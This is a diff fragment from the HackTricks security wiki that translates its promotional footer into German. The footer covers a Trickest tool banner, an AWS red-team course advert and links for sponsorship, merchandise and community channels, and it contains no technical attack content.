 
 {% content-ref url="windows-security-controls/uac-user-account-control.md" %}
 [uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
@@ -286,8 +294,8 @@ The SSPI will be in charge of finding the adequate protocol for two machines tha
 <figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um Workflows einfach zu erstellen und zu automatisieren, die von den fortschrittlichsten Community-Tools der Welt unterstützt werden.\
+Erhalten Sie noch heute Zugriff:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
@@ -295,14 +303,14 @@ Get Access Today:
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Lernen Sie das Hacken von AWS von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Andere Möglichkeiten, HackTricks zu unterstützen:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
+* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
+* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder folgen Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.
 
 </details>
